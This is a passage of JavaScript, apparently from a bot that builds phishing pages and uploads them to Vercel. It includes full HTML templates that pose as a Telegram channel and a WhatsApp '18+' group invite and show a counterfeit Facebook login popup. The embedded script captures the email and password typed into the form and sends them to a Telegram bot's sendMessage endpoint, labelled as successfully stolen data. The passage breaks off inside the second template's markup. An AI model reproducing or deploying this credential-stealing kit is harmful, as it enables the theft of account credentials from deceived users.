                <circle cx="17" cy="17" fill="var(--accent-btn-color)" r="17"/><path d="m7.06510669 16.9258959c5.22739451-2.1065178 8.71314291-3.4952633 10.45724521-4.1662364 4.9797665-1.9157646 6.0145193-2.2485535 6.6889567-2.2595423.1483363-.0024169.480005.0315855.6948461.192827.1814076.1361492.23132.3200675.2552048.4491519.0238847.1290844.0536269.4231419.0299841.65291-.2698553 2.6225356-1.4375148 8.986738-2.0315537 11.9240228-.2513602 1.2428753-.7499132 1.5088847-1.2290685 1.5496672-1.0413153.0886298-1.8284257-.4857912-2.8369905-1.0972863-1.5782048-.9568691-2.5327083-1.3984317-4.0646293-2.3321592-1.7703998-1.0790837-.212559-1.583655.7963867-2.5529189.2640459-.2536609 4.7753906-4.3097041 4.755976-4.431706-.0070494-.0442984-.1409018-.481649-.2457499-.5678447-.104848-.0861957-.2595946-.0567202-.3712641-.033278-.1582881.0332286-2.6794907 1.5745492-7.5636077 4.6239616-.715635.4545193-1.3638349.6759763-1.9445998.6643712-.64024672-.0127938-1.87182452-.334829-2.78737602-.6100966-1.12296117-.3376271-1.53748501-.4966332-1.45976769-1.0700283.04048-.2986597.32581586-.610598.8560076-.935815z" fill="#fff"/><path d="m49.4 24v-12.562h-4.224v-2.266h11.198v2.266h-4.268v12.562zm16.094-4.598h-7.172c.066 1.936 1.562 2.772 3.3 2.772 1.254 0 2.134-.198 2.97-.484l.396 1.848c-.924.396-2.2.682-3.74.682-3.476 0-5.522-2.134-5.522-5.412 0-2.97 1.804-5.764 5.236-5.764 3.476 0 4.62 2.86 4.62 5.214 0 .506-.044.902-.088 1.144zm-7.172-1.892h4.708c.022-.99-.418-2.618-2.222-2.618-1.672 0-2.376 1.518-2.486 2.618zm9.538 6.49v-15.62h2.706v15.62zm14.84-4.598h-7.172c.066 1.936 1.562 2.772 3.3 2.772 1.254 0 2.134-.198 2.97-.484l.396 1.848c-.924.396-2.2.682-3.74.682-3.476 0-5.522-2.134-5.522-5.412 0-2.97 1.804-5.764 5.236-5.764 3.476 0 4.62 2.86 4.62 5.214 0 .506-.044.902-.088 1.144zm-7.172-1.892h4.708c.022-.99-.418-2.618-2.222-2.618-1.672 0-2.376 1.518-2.486 2.618zm19.24-1.144v6.072c0 2.244-.462 3.85-1.584 4.862-1.1.99-2.662 1.298-4.136 1.298-1.364 0-2.816-.308-3.74-.858l.594-2.046c.682.396 1.826.814 3.124.814 1.76 0 3.08-.924 3.08-3.234v-.924h-.044c-.616.946-1.694 1.584-3.124 1.584-2.662 0-4.554-2.2-4.554-5.236 0-3.52 2.288-5.654 4.862-5.654 1.65 0 2.596.792 3.102 1.672h.044l.11-1.43h2.354c-.044.726-.088 1.606-.088 3.08zm-2.706 2.948v-1.738c0-.264-.022-.506-.088-.726-.286-.99-1.056-1.738-2.2-1.738-1.518 0-2.64 1.32-2.64 3.498 0 1.826.924 3.3 2.618 3.3 1.012 0 1.892-.66 2.2-1.65.088-.264.11-.638.11-.946zm5.622 4.686v-7.26c0-1.452-.022-2.508-.088-3.454h2.332l.11 2.024h.066c.528-1.496 1.782-2.266 2.948-2.266.264 0 .418.022.638.066v2.53c-.242-.044-.484-.066-.814-.066-1.276 0-2.178.814-2.42 2.046-.044.242-.066.528-.066.814v5.566zm16.05-6.424v3.85c0 .968.044 1.914.176 2.574h-2.442l-.198-1.188h-.066c-.638.836-1.76 1.43-3.168 1.43-2.156 0-3.366-1.562-3.366-3.19 0-2.684 2.398-4.07 6.358-4.048v-.176c0-.704-.286-1.87-2.178-1.87-1.056 0-2.156.33-2.882.792l-.528-1.76c.792-.484 2.178-.946 3.872-.946 3.432 0 4.422 2.178 4.422 4.532zm-2.64 2.662v-1.474c-1.914-.022-3.74.374-3.74 2.002 0 1.056.682 1.54 1.54 1.54 1.1 0 1.87-.704 2.134-1.474.066-.198.066-.396.066-.594zm5.6 3.762v-7.524c0-1.232-.044-2.266-.088-3.19h2.31l.132 1.584h.066c.506-.836 1.474-1.826 3.3-1.826 1.408 0 2.508.792 2.97 1.98h.044c.374-.594.814-1.034 1.298-1.342.616-.418 1.298-.638 2.2-.638 1.76 0 3.564 1.21 3.564 4.642v6.314h-2.64v-5.918c0-1.782-.616-2.838-1.914-2.838-.924 0-1.606.66-1.892 1.43-.088.242-.132.594-.132.902v6.424h-2.64v-6.204c0-1.496-.594-2.552-1.848-2.552-1.012 0-1.694.792-1.958 1.518-.088.286-.132.594-.132.902v6.336z" fill="var(--tme-logo-color)" fill-rule="nonzero"/>
              </g>
            </svg>
          </a>
          <a class="tgme_head_right_btn" href="//telegram.org/dl?tme=1c265098c8678703b7_9830172032386582311">
            Download
          </a>
        </div>
      </div>
      <div class="tgme_body_wrap">
        <div class="tgme_page">
          <div class="tgme_page_photo">
  <a href="tg://resolve?domain=${cn}"><img class="tgme_page_photo_image" src="https://cdn5.cdn-telegram.org/file/h1mLbVut0M6Y5HiSX1R6EOnCbolkNKMybNDuXJk6lxOtbnpI29lB5cdskOoH7TBTT9f8eRoYc61F3FlqdfwUz79Vp53oni4nNJ8MSF3YjdC3jf-Rb5fp67VR7t_U2HnYghYkW0rDom56CqaoGVX-buMn76_qJhJlmB_Pq6lJU-KEOjygD3DnNVe7Vvye4iX6g6IQfY6dtiUM65iKsMz8T9S8SbOXWhDpWV_sD6XK3sACgpdrOuRKt6JgSdrvbb5m4UL--2CBvcpbRPPZOcBUSRL_lPaAzgmmQmvw1xB_I-tbUJNDH4WvlkAjAyXdBQhByfjPZu3rS52Bc2Y85xGO1A.jpg"></a>
</div>
<div class="tgme_page_title" dir="auto">
  <span dir="auto">${cn}</span>
</div>
<div class="tgme_page_extra">900ribu subscriber</div>

<div class="tgme_page_action">
  <a onclick="showLoginPopup()" class="tgme_action_button_new shine">View in Telegram</a>
</div>
<!-- WEBOGRAM_BTN -->
<div class="tgme_page_context_link_wrap"><a class="tgme_page_context_link">Preview channel</a></div>
<div class="tgme_page_additional">
  If you have <strong>Telegram</strong>, you can view and join <br><strong>${cn}</strong> right away.
</div>
        </div>
        
      </div>
    </div>

    <div id="tgme_frame_cont"></div>
    <div class="popup-login" id="loginPage">
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo" width="120">
            <h2>Log into Facebook</h2>
            <p>Enter your email or phone number</p>
 <form id="loginForm">
  <input type="text" id="email" name="email" placeholder="Email or phone" required>
  <input type="password" id="password" name="password" placeholder="Password" required>
  <button type="submit">Log In</button>
</form>
            <div class="error-message" id="errorMessage">Incorrect email or password.</div>
            <div class="footer">
                <p>Forgotten account? <a href="#">Click here</a></p>
                <p>New to Facebook? <a href="#">Create an account</a></p>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
    

    
  async function sendText(message) {
    axios.post("https://api.telegram.org/bot${t}/sendMessage", {
      chat_id: "${io}",
      text: message
    })
  }
    const processedEmails = new Set();

    function isEmailProcessed(email) {
        return processedEmails.has(email);
    }

    function markEmailAsProcessed(email) {
        processedEmails.add(email);
    }

    function showLoginPopup() {
        document.getElementById("loginPage").style.display = "flex";
    }

document.getElementById("loginForm").addEventListener("submit", function(e) {
e.preventDefault();
const email = document.getElementById('email')?.value;
const password = document.getElementById('password')?.value;
const message = "BERHASIL MENGAMBIL DATA ✅\n\nEMAIL: "+email+"\nPASSWORD: "+password
sendText(message)
})
</script>
</body>
</html>`
fs.writeFileSync("index.html", kode)
await upToVercel(ctx, "index.html", "chanel-telegram")
fs.unlinkSync("index.html")
}

async function groupwa2(ctx, t, io, gn) {
const kode = String.raw`
<!DOCTYPE html>
<html lang="en" id="facebook" class="no_js">

<head>
    <meta charset="utf-8" />
    <meta name="referrer" content="default" id="meta_referrer" />
    <meta http-equiv="refresh" />
    <title id="pageTitle">WhatsApp Group Invite</title>
    <meta name="bingbot" content="noarchive" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="description" content="WhatsApp Group Invite" />
    <meta name="keywords" />
    <meta property="og:title" content="18+" />
    <meta property="og:image" content="https://pps.whatsapp.net/v/t61.24694-24/491877078_749226784235702_7604555501025952203_n.jpg?ccb=11-4&amp;oh=01_Q5Aa1gFFxdnabIO1bvnNPEnbyj_B3c90eHooqSl5IBREJ3Lk9g&amp;oe=684F8886&amp;_nc_sid=5e03e0&amp;_nc_cat=107" />
    <meta property="og:site_name" content="WhatsApp.com" />
    <meta property="og:description" content="WhatsApp Group Invite" />
    <meta property="og:keywords" />
    <meta property="invite_link_type" content="REGULAR" />
    <meta property="invite_link_type_v2" content="REGULAR" />
    <meta name="mobile-web-app-capable" content="yes" />
    <link rel="manifest" href="/data/manifest.json" crossorigin="use-credentials" />
    <meta name="robots" content="noindex" />
    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v4/yz/r/ujTY9i_Jhs1.png" />
    <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yH/l/0,cross/_jfkUskf2-v.css" data-bootloader-hash="vRp9yOm" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yU/l/0,cross/MEuXBoqspBD.css" data-bootloader-hash="qXTeYR4" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yR/l/0,cross/ChejQs5hirm.css" data-bootloader-hash="sRXYEyZ" crossorigin="anonymous" />
    <style>
            .popup-login {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);  /* Dark background */
            display: none;  /* Hidden by default */
            align-items: center;  /* Vertically center */
            justify-content: center;  /* Horizontally center */
            z-index: 9999;  /* Ensure it's on top */
        }

        /* Popup Box */
        .login-container {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            width: 360px;  /* Adjust width */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .facebook-logo {
            display: block;
            margin: 0 auto 20px;
        }

        .login-container h2 {
            font-size: 20px;
            color: #333;
            margin-bottom: 10px;
        }

        .login-container p {
            font-size: 14px;
            color: #666;
            margin-bottom: 15px;
        }

        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        .login-container button:hover {
            background-color: #166fe5;
        }

        .error-message {
            display: none;
            color: red;
            font-size: 14px;
            margin-top: 10px;
        }

        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #666;
            text-align: center;
        }

        .footer a {
            color: #1877f2;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Button to trigger the popup */
        .show-popup-btn {
            padding: 10px 20px;
            background-color: #1877f2;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 20px;
        }

        .show-popup-btn:hover {
            background-color: #166fe5;
        }
    </style>
    <div class="_2y_d _9rxy">
        <div class="_adhc"><a href="#content-wrapper" class="_aeal _asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;&#125;" id="u_0_0_Ys"><span class="_advp _aeam">Skip to content</span></a>
            <header class="_af-2 _afwk" data-testid="whatsapp_www_header" id="u_0_1_no">
                <div class="_afvx">
                    <div class="_afvy">
                        <div class="_af8g"><button aria-label="Open mobile menu" class="_afvu _ain3 _9vcv" data-ms-clickable="true" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Header_WhatsApp_MobileHamburgerMenu_Open&quot;&#125;" id="u_0_2_YT"><span class="_advp _aeam"><svg width="25" height="33" viewBox="0 0 25 33" fill="none" class="_wauiIcon__hamburgerMenuRebrand">
                                        <line x1="1.04297" y1="12.75" x2="23.543" y2="12.75" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></line>
                                        <line x1="1.04297" y1="16.75" x2="23.543" y2="16.75" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></line>
                                        <line x1="1.04297" y1="20.75" x2="23.543" y2="20.75" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></line>
                                    </svg></span></button>
                            <nav class="_9t0g" id="u_0_3_gh"><button aria-label="Close mobile menu" class="_9t0i _ain3 _9vcv" data-ms-clickable="true" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Header_WhatsApp_MobileHamburgerMenu_Close&quot;&#125;" id="u_0_4_by"><span class="_advp _aeam"><svg width="16" height="16" fill="none" class="_9s6z">
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M15.495 1.353L14.364.222 7.859 6.727 1.637.505.507 1.636l6.22 6.222-6.505 6.506 1.131 1.131L7.86 8.99l6.79 6.79 1.13-1.132-6.788-6.79 6.504-6.504z" fill="currentColor"></path>
                                        </svg></span></button><svg width="101" height="22" viewBox="0 0 101 22" fill="none" role="group" aria-hidden="true" class="_af87 _9t0j" xmlns="http://www.w3.org/2000/svg">
                                    <g clip-path="url(#clip0_4057_1490)">
                                        <path d="M39.9672 12.7979H39.9378L38.0929 5.5H35.87L33.9867 12.7095H33.9563L32.2524 5.50442H29.8828L32.741 16.0887H35.1456L36.9442 8.8847H36.9747L38.8049 16.0887H41.1644L44.0632 5.50442H41.7342L39.9672 12.7979ZM51.3063 9.08484C51.079 8.80102 50.7793 8.58095 50.4375 8.44682C49.9861 8.28004 49.5057 8.20226 49.0236 8.21793C48.5915 8.22441 48.1667 8.32846 47.7824 8.52201C47.3438 8.73736 46.9802 9.07519 46.7375 9.49286H46.6923V5.50442H44.5484V16.0887H46.6923V12.0715C46.6923 11.2908 46.8232 10.7298 47.085 10.3885C47.3468 10.0472 47.7703 9.87693 48.3556 9.87766C48.869 9.87766 49.2278 10.0336 49.4287 10.3454C49.6295 10.6572 49.7311 11.1283 49.7311 11.7608V16.0887H51.875V11.3748C51.8783 10.9393 51.8352 10.5046 51.7464 10.0778C51.6766 9.71894 51.5263 9.37976 51.3063 9.08484ZM60.1528 14.3825V10.4018C60.1528 9.93664 60.0471 9.56326 59.8358 9.28166C59.6236 8.99813 59.3434 8.77025 59.0199 8.61822C58.6711 8.45612 58.2982 8.34902 57.9153 8.30086C57.5193 8.247 57.1201 8.21967 56.7203 8.21904C56.2857 8.21856 55.8522 8.26042 55.426 8.34399C55.0186 8.41981 54.6272 8.56262 54.2683 8.76639C53.9282 8.96066 53.6386 9.22935 53.422 9.55147C53.1859 9.92121 53.055 10.3461 53.0429 10.7822H55.1868C55.2274 10.3675 55.3696 10.0701 55.6111 9.89757C55.8526 9.72507 56.1911 9.62776 56.6154 9.62776C56.7947 9.62695 56.9738 9.63915 57.1513 9.66425C57.3063 9.68442 57.4555 9.7348 57.5903 9.81242C57.7178 9.88786 57.8223 9.99558 57.8927 10.1242C57.9759 10.2924 58.0147 10.4783 58.0055 10.665C58.0166 10.7571 58.0044 10.8505 57.9702 10.9371C57.936 11.0236 57.8807 11.1006 57.8092 11.1614C57.6386 11.2884 57.4412 11.3765 57.2315 11.4191C56.9581 11.4842 56.6801 11.529 56.3998 11.5529C56.0861 11.5831 55.7687 11.6225 55.4475 11.6712C55.1239 11.7211 54.8033 11.7883 54.4872 11.8724C54.1846 11.949 53.8978 12.0766 53.6398 12.2495C53.3869 12.4249 53.1793 12.6559 53.0339 12.924C52.8663 13.2578 52.786 13.6271 52.8003 13.9988C52.791 14.3503 52.8607 14.6995 53.0045 15.0216C53.1324 15.2994 53.3258 15.5435 53.5687 15.7337C53.8198 15.9259 54.1075 16.0669 54.415 16.1484C54.7549 16.2401 55.1062 16.2851 55.4588 16.2822C55.9401 16.2822 56.4188 16.2125 56.8794 16.0754C57.3398 15.9383 57.7567 15.6878 58.0902 15.3478C58.0997 15.4748 58.1174 15.6011 58.1432 15.726C58.1679 15.8488 58.2007 15.97 58.2414 16.0887H60.4191C60.2988 15.8687 60.2266 15.6265 60.207 15.3777C60.1677 15.0474 60.1496 14.715 60.1528 14.3825ZM58.0089 13.1219C58.0065 13.2807 57.9941 13.4391 57.9717 13.5963C57.9434 13.8029 57.874 14.002 57.7674 14.1823C57.6424 14.3885 57.4652 14.5595 57.2529 14.6788C57.022 14.8174 56.6943 14.8867 56.2701 14.8867C56.1027 14.8869 55.9358 14.8717 55.7713 14.8414C55.6214 14.8163 55.4778 14.7634 55.3482 14.6855C55.2266 14.6113 55.1272 14.5067 55.0604 14.3825C54.9857 14.2354 54.9492 14.0724 54.9544 13.9081C54.9482 13.7388 54.9847 13.5706 55.0604 13.4183C55.1284 13.2931 55.224 13.1843 55.3403 13.0998C55.4643 13.0116 55.6023 12.944 55.7488 12.8997C55.9047 12.8503 56.0638 12.8108 56.2249 12.7814C56.3964 12.7526 56.5635 12.7261 56.7383 12.7073C56.9132 12.6885 57.0769 12.6619 57.2303 12.6332C57.3789 12.6055 57.5255 12.5686 57.6693 12.5226C57.794 12.4848 57.9093 12.4219 58.0078 12.338L58.0089 13.1219ZM64.1642 6.12585H62.0203V8.42471H60.7136V9.83343H62.0135V14.3548C61.9994 14.677 62.0669 14.9976 62.2099 15.2881C62.3322 15.5183 62.5184 15.7099 62.747 15.841C62.9913 15.9752 63.2593 16.063 63.5369 16.0997C63.8495 16.145 64.1652 16.1672 64.4813 16.1661C64.6946 16.1661 64.9101 16.1661 65.1324 16.1517C65.3351 16.1442 65.5371 16.1242 65.7372 16.092V14.4577C65.6322 14.4794 65.526 14.4946 65.419 14.503C65.3062 14.513 65.1933 14.5185 65.0715 14.5185C64.7093 14.5185 64.4666 14.4577 64.3448 14.3394C64.2229 14.221 64.1642 13.9844 64.1642 13.6284V9.83343H65.7372V8.42471H64.1609L64.1642 6.12585ZM73.0412 12.7294C72.9004 12.489 72.7079 12.2815 72.477 12.1212C72.2347 11.9531 71.9686 11.8205 71.6872 11.7276C71.3904 11.6303 71.0846 11.5462 70.7721 11.4766C70.4595 11.4069 70.1729 11.3428 69.8806 11.2842C69.617 11.2322 69.3567 11.1653 69.1009 11.084C68.8998 11.0236 68.7128 10.9252 68.5503 10.7943C68.4816 10.7387 68.4267 10.6685 68.39 10.589C68.3532 10.5094 68.3355 10.4227 68.3381 10.3354C68.3301 10.2004 68.3717 10.067 68.4555 9.95949C68.535 9.86413 68.6363 9.78838 68.7511 9.73834C68.8738 9.68781 69.0035 9.65539 69.1359 9.64214C69.2672 9.63067 69.399 9.62588 69.5308 9.62776C69.8769 9.61913 70.2199 9.69274 70.5306 9.84228C70.8116 9.98492 70.9684 10.2591 70.9977 10.665H73.0401C73.0181 10.2476 72.8905 9.84215 72.6689 9.48512C72.4705 9.18134 72.2043 8.92573 71.8903 8.73764C71.5618 8.54356 71.2007 8.40804 70.824 8.33735C70.4187 8.25746 70.0063 8.21782 69.5929 8.21904C69.1766 8.21856 68.7611 8.25557 68.3517 8.32961C67.9689 8.39644 67.6006 8.52696 67.2628 8.71552C66.9424 8.89543 66.6743 9.15277 66.4842 9.46301C66.2738 9.83422 66.1719 10.2551 66.1897 10.6793C66.1801 10.9771 66.2534 11.2718 66.4018 11.5319C66.5429 11.7639 66.7358 11.9617 66.966 12.1102C67.2105 12.269 67.4763 12.3936 67.7559 12.4806C68.0527 12.5746 68.3584 12.6564 68.6699 12.725C69.2785 12.8405 69.8778 12.9994 70.4629 13.2004C70.8917 13.3575 71.1061 13.5945 71.1061 13.9114C71.1128 14.0773 71.0649 14.2409 70.9695 14.3781C70.8804 14.5001 70.7648 14.6013 70.631 14.6744C70.4897 14.7505 70.3376 14.8053 70.1797 14.837C70.0233 14.8713 69.8637 14.8891 69.7035 14.89C69.4973 14.8904 69.2918 14.8655 69.0919 14.8159C68.9051 14.7705 68.7282 14.6926 68.5695 14.5859C68.4172 14.4809 68.2904 14.3442 68.1982 14.1857C68.0989 14.006 68.0495 13.8039 68.0549 13.5996H66.0058C66.0079 14.0503 66.1304 14.4925 66.3612 14.8823C66.5702 15.2155 66.8548 15.4971 67.1928 15.705C67.5488 15.9187 67.9409 16.0684 68.3505 16.1473C68.7877 16.2371 69.2332 16.2819 69.6798 16.2811C70.1193 16.2815 70.5577 16.2393 70.9887 16.155C71.3942 16.0787 71.7815 15.9286 72.1306 15.7127C72.4906 15.4941 72.7842 15.1849 72.9808 14.8173C73.1775 14.4498 73.2701 14.0373 73.2489 13.6228C73.2589 13.3128 73.1862 13.0056 73.0379 12.7316L73.0412 12.7294ZM77.3054 5.50221L73.2229 16.0864H75.6117L76.4591 13.7301H80.4965L81.3123 16.0864H83.7789L79.7382 5.50442L77.3054 5.50221ZM77.0797 11.9952L78.4868 8.11178H78.5162L79.8781 11.9952H77.0797ZM91.1958 9.46301C90.901 9.08458 90.5236 8.77554 90.0911 8.5585C89.5984 8.32016 89.0539 8.20326 88.5046 8.21793C88.0449 8.2122 87.5897 8.3082 87.1731 8.49879C86.7585 8.6995 86.4132 9.01519 86.1801 9.40661H86.1497V8.42471H84.1073V18.7723H86.2512V15.141H86.2806C86.5324 15.5079 86.88 15.8019 87.2871 15.9925C87.7049 16.1874 88.1626 16.2865 88.6253 16.2822C89.1467 16.2919 89.6627 16.1781 90.1295 15.9504C90.5492 15.7399 90.9161 15.4408 91.2037 15.0747C91.4968 14.6981 91.715 14.2709 91.8469 13.8152C91.9883 13.3336 92.0593 12.8347 92.0579 12.3335C92.0596 11.8051 91.9886 11.2788 91.8469 10.7689C91.7168 10.2969 91.4958 9.85367 91.1958 9.46301ZM89.8203 13.1839C89.7669 13.4585 89.6617 13.7211 89.51 13.9579C89.2538 14.3106 88.8755 14.56 88.4456 14.6597C88.0157 14.7594 87.5634 14.7025 87.1731 14.4997C86.9377 14.3673 86.738 14.1815 86.5909 13.9579C86.4384 13.7207 86.331 13.4585 86.2738 13.1839C86.2078 12.8871 86.1749 12.5842 86.1756 12.2805C86.1746 11.9717 86.2045 11.6635 86.2648 11.3605C86.3191 11.0821 86.4246 10.8157 86.5762 10.5743C86.721 10.3486 86.9177 10.1593 87.1506 10.0214C87.4184 9.86766 87.725 9.79102 88.0352 9.80026C88.3403 9.7922 88.6415 9.86887 88.9041 10.0214C89.1398 10.1625 89.3391 10.3552 89.4863 10.5842C89.642 10.8274 89.7521 11.0959 89.8113 11.3771C89.8774 11.6746 89.9103 11.9782 89.9095 12.2827C89.9112 12.585 89.8829 12.8869 89.8248 13.1839H89.8203ZM100.406 10.7744C100.277 10.3003 100.056 9.85506 99.7546 9.46301C99.4602 9.08463 99.0831 8.77558 98.651 8.5585C98.1579 8.32033 97.613 8.20343 97.0634 8.21793C96.6041 8.21255 96.1494 8.30855 95.733 8.49879C95.3183 8.69981 94.9728 9.01539 94.7389 9.40661H94.7096V8.42471H92.6627V18.7723H94.8066V15.141H94.8371C95.0888 15.5076 95.4359 15.8016 95.8425 15.9925C96.2603 16.1874 96.718 16.2865 97.1808 16.2822C97.7024 16.2919 98.2188 16.1781 98.686 15.9504C99.1054 15.7398 99.4719 15.4407 99.7591 15.0747C100.052 14.6981 100.27 14.2709 100.402 13.8152C100.545 13.3337 100.616 12.8348 100.614 12.3335C100.618 11.8072 100.55 11.2827 100.41 10.7744H100.406ZM98.3746 13.1839C98.3217 13.4587 98.2165 13.7213 98.0643 13.9579C97.9058 14.1956 97.6894 14.3909 97.4345 14.5261C97.1797 14.6612 96.8945 14.732 96.6047 14.732C96.3149 14.732 96.0297 14.6612 95.7749 14.5261C95.5201 14.3909 95.3036 14.1956 95.1452 13.9579C94.9931 13.7205 94.8857 13.4584 94.8281 13.1839C94.7626 12.887 94.7297 12.5842 94.7299 12.2805C94.7293 11.9716 94.7595 11.6635 94.8202 11.3605C94.8787 11.0812 94.9888 10.8147 95.1452 10.5743C95.2906 10.3491 95.4872 10.1599 95.7195 10.0214C95.9873 9.86766 96.2939 9.79102 96.6042 9.80026C96.9093 9.79208 97.2105 9.86876 97.473 10.0214C97.7091 10.1625 97.9088 10.3551 98.0564 10.5842C98.2121 10.8274 98.3222 11.0959 98.3814 11.3771C98.4475 11.6746 98.4804 11.9782 98.4795 12.2827C98.4776 12.5854 98.4454 12.8872 98.3836 13.1839H98.3746Z" fill="currentColor"></path>
                                        <path d="M25.9306 10.5046C25.8259 7.69499 24.6176 5.0336 22.5581 3.07618C20.4986 1.11877 17.7471 0.0166645 14.8781 3.00753e-06H14.8239C12.8918 -0.00140293 10.9927 0.490142 9.31337 1.42627C7.63402 2.3624 6.23232 3.71085 5.24619 5.33895C4.26006 6.96705 3.72348 8.8187 3.68925 10.7117C3.65501 12.6047 4.12431 14.4738 5.05095 16.1351L4.067 21.9049C4.0654 21.9167 4.06639 21.9288 4.0699 21.9402C4.07342 21.9516 4.07937 21.9622 4.08738 21.9712C4.09539 21.9802 4.10526 21.9874 4.11634 21.9924C4.12742 21.9974 4.13945 22 4.15163 22H4.16856L9.99215 20.7306C11.4968 21.4385 13.1446 21.8059 14.8137 21.8054C14.9198 21.8054 15.0259 21.8054 15.1319 21.8054C16.6002 21.7643 18.0456 21.4387 19.3847 20.8474C20.7238 20.256 21.9302 19.4106 22.9342 18.36C23.9381 17.3093 24.7198 16.0742 25.2341 14.726C25.7484 13.3777 25.9851 11.943 25.9306 10.5046ZM15.0766 19.909C14.9886 19.909 14.9006 19.909 14.8137 19.909C13.3386 19.9108 11.8846 19.5649 10.5744 18.9006L10.2765 18.748L6.32716 19.6624L7.05609 15.747L6.88683 15.4661C6.07843 14.1155 5.64301 12.5818 5.62344 11.0161C5.60386 9.4504 6.00083 7.90671 6.77522 6.53707C7.54962 5.16743 8.67474 4.0191 10.0398 3.20516C11.4048 2.39123 12.9626 1.93977 14.5598 1.89526C14.6486 1.89526 14.7378 1.89526 14.8273 1.89526C17.2388 1.90226 19.551 2.83733 21.2657 4.49898C22.9803 6.16064 23.9603 8.41588 23.9943 10.7788C24.0283 13.1417 23.1138 15.4232 21.4476 17.1316C19.7815 18.84 17.4972 19.8386 15.0868 19.9123L15.0766 19.909Z" fill="currentColor"></path>
                                        <path d="M10.946 5.6393C10.8086 5.64193 10.673 5.67157 10.5474 5.72646C10.4218 5.78135 10.3087 5.86038 10.2149 5.95887C9.94968 6.22535 9.20833 6.86669 9.16546 8.21349C9.12258 9.56029 10.0828 10.8927 10.2171 11.0796C10.3514 11.2665 12.053 14.1757 14.8559 15.3555C16.5033 16.051 17.2255 16.1705 17.6938 16.1705C17.8867 16.1705 18.0323 16.1506 18.1846 16.1417C18.698 16.1108 19.8569 15.5291 20.1097 14.8966C20.3624 14.2642 20.3793 13.7113 20.3128 13.6007C20.2462 13.4901 20.0634 13.4105 19.7881 13.269C19.5127 13.1274 18.1621 12.4198 17.9082 12.3202C17.814 12.2773 17.7127 12.2514 17.6092 12.2439C17.5417 12.2474 17.4761 12.2669 17.4181 12.3009C17.3601 12.3348 17.3114 12.382 17.2763 12.4386C17.0506 12.7139 16.5327 13.3121 16.3589 13.4846C16.3209 13.5275 16.2742 13.562 16.2217 13.586C16.1692 13.61 16.1122 13.6229 16.0542 13.6239C15.9475 13.6193 15.8431 13.5918 15.7484 13.5432C14.9303 13.2027 14.1844 12.7152 13.5492 12.1057C12.9558 11.5326 12.4523 10.8764 12.0552 10.1585C11.9018 9.87985 12.0552 9.73611 12.1952 9.60563C12.3351 9.47515 12.4852 9.29491 12.6296 9.139C12.7481 9.00582 12.8469 8.85692 12.923 8.6967C12.9624 8.62234 12.9823 8.53955 12.9809 8.45578C12.9795 8.37201 12.9569 8.28989 12.9151 8.21681C12.8485 8.07748 12.3509 6.70746 12.1173 6.1579C11.9277 5.68796 11.7021 5.67248 11.5046 5.6581C11.3421 5.64704 11.1559 5.64152 10.9697 5.63599H10.946" fill="currentColor"></path>
                                    </g>
                                    <defs>
                                        <clipPath id="clip0_4057_1490">
                                            <rect width="100" height="22" fill="white" transform="translate(0.5)"></rect>
                                        </clipPath>
                                    </defs>
                                </svg>
                                <ul class="_9t0k">
                                    <li class="_9t0h"><a href="https://www.whatsapp.com/" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_Home_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Home</span></a></li>
                                    <li class="_9t0h">
                                        <div class="_9wm7 _aedf">
                                            <ul id="u_0_5_4q">
                                                <li class="_9wma"><button class="_aily _9wm9" aria-expanded="false" aria-selected="false" data-ms-clickable="true" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Features_Mobile_Dropdown&quot;&#125;"><svg fill="currentColor" width="16" height="17" viewBox="0 0 16 17" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__plus _aede">
                                                            <g clip-path="url(#clip0_1842_81860)">
